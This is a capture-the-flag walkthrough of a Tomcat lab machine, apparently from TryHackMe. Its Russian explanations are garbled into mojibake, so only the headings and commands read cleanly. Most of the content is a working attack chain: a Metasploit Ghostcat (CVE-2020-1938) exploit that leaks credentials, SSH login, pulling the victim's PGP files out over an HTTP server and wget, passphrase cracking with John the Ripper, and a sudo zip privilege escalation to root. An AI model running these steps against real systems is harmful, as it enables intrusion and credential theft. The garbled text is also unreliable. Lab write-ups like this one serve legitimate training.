Reconnaissance
–ü–µ—Ä–≤—ã–º —à–∞–≥–æ–º –≤—ã–ø–æ–ª–Ω—è–µ–º —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ –ø–æ—Ä—Ç–æ–≤:
22/tcp   open  ssh
53/tcp   open  domain
8009/tcp open  ajp13
8080/tcp open  http

–ü–æ—Ä—Ç 8080 —É–∫–∞–∑—ã–≤–∞–µ—Ç –Ω–∞ Apache Tomcat, –∞ 8009 (AJP) –ø–æ—Ç–µ–Ω—Ü–∏–∞–ª—å–Ω–æ —É—è–∑–≤–∏–º –∫ Ghostcat (CVE-2020-1938).

üåê Web Enumeration (Tomcat Ghostcat)
http://<IP>:8080
–î–ª—è —ç–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏–∏ –∏—Å–ø–æ–ª—å–∑—É–µ–º Metasploit:

msfconsole
search tomcat
use auxiliary/admin/http/tomcat_ghostcat
set RHOSTS <IP>
set RPORT 8009
run

–í —Ä–µ–∑—É–ª—å—Ç–∞—Ç–µ –ø–æ–ª—É—á–∞–µ–º —á—É–≤—Å—Ç–≤–∏—Ç–µ–ª—å–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ –∏–∑ web.xml:
skyfuck:8730281lkjlkjdqlksalks

**username: skyfuck**
**pass: 8730281lkjlkjdqlksalks**

üîê Initial Access (SSH)

–ü–æ–¥–∫–ª—é—á–∞–µ–º—Å—è –ø–æ SSH:
ssh skyfuck@<IP>

üìÅ File Transfer

–í –¥–æ–º–∞—à–Ω–µ–π –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –æ–±–Ω–∞—Ä—É–∂–µ–Ω—ã —Ñ–∞–π–ª—ã:

* credential.pgp
* tryhackme.asc

–ó–∞–ø—É—Å–∫–∞–µ–º HTTP-—Å–µ—Ä–≤–µ—Ä –Ω–∞ –º–∞—à–∏–Ω–µ –∂–µ—Ä—Ç–≤—ã:
python3 -m http.server 1234

–°–∫–∞—á–∏–≤–∞–µ–º —Ñ–∞–π–ª—ã –Ω–∞ Kali:
wget http://<IP>:1234/credential.pgp
wget http://<IP>:1234/tryhackme.asc

üîë PGP Key Cracking

–ö–æ–Ω–≤–µ—Ä—Ç–∏—Ä—É–µ–º PGP-–∫–ª—é—á –≤ —Ñ–æ—Ä–º–∞—Ç –¥–ª—è John:
gpg2john tryhackme.asc > hash

–ó–∞–ø—É—Å–∫–∞–µ–º –±—Ä—É—Ç—Ñ–æ—Ä—Å:
john hash --wordlist=/usr/share/wordlists/rockyou.txt

–ù–∞–π–¥–µ–Ω –ø–∞—Ä–æ–ª—å:
**alexandru**

–ò–º–ø–æ—Ä—Ç–∏—Ä—É–µ–º –∫–ª—é—á –∏ —Ä–∞—Å—à–∏—Ñ—Ä–æ–≤—ã–≤–∞–µ–º —Ñ–∞–π–ª:

* gpg --import tryhackme.asc
* gpg --decrypt credential.pgp

–†–µ–∑—É–ª—å—Ç–∞—Ç:
merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j

**username: merlin**
**pass: asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j**

üë§ User Flag

–ü–µ—Ä–µ–∫–ª—é—á–∞–µ–º—Å—è –Ω–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è merlin:
su merlin

–ß–∏—Ç–∞–µ–º user flag:
cat user.txt

‚úÖ User flag –ø–æ–ª—É—á–µ–Ω

üöÄ Privilege Escalation

–ü—Ä–æ–≤–µ—Ä—è–µ–º sudo-–ø—Ä–∞–≤–∞:
sudo -l

Output:
(ALL) NOPASSWD: /usr/bin/zip

–ò—Å–ø–æ–ª—å–∑—É–µ–º –∏–∑–≤–µ—Å—Ç–Ω—É—é —Ç–µ—Ö–Ω–∏–∫—É –∏–∑ GTFOBins:
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'

–ü–æ–ª—É—á–∞–µ–º root-shell:
whoami
> # root

–ß–∏—Ç–∞–µ–º root flag:
cat /root/root.txt

‚úÖ Root flag –ø–æ–ª—É—á–µ–Ω


üèÅ Conclusion

–í –¥–∞–Ω–Ω–æ–º –∑–∞–¥–∞–Ω–∏–∏ –±—ã–ª–∏ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω—ã:
* –£—è–∑–≤–∏–º–æ—Å—Ç—å Ghostcat (CVE-2020-1938)
* –ö—Ä–∞–∂–∞ –∏ —Ä–∞—Å—à–∏—Ñ—Ä–æ–≤–∫–∞ PGP-–∫–ª—é—á–µ–π
* Password cracking —Å John the Ripper
* Privilege Escalation —á–µ—Ä–µ–∑ sudo + zip

–ó–∞–¥–∞–Ω–∏–µ –æ—Ç–ª–∏—á–Ω–æ –¥–µ–º–æ–Ω—Å—Ç—Ä–∏—Ä—É–µ—Ç –≤–∞–∂–Ω–æ—Å—Ç—å:
* –∑–∞—â–∏—Ç—ã AJP
* –∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã—Ö sudo-–Ω–∞—Å—Ç—Ä–æ–µ–∫
* –±–µ–∑–æ–ø–∞—Å–Ω–æ–≥–æ —Ö—Ä–∞–Ω–µ–Ω–∏—è –∫—Ä–∏–ø—Ç–æ–≥—Ä–∞—Ñ–∏—á–µ—Å–∫–∏—Ö –∫–ª—é—á–µ–π
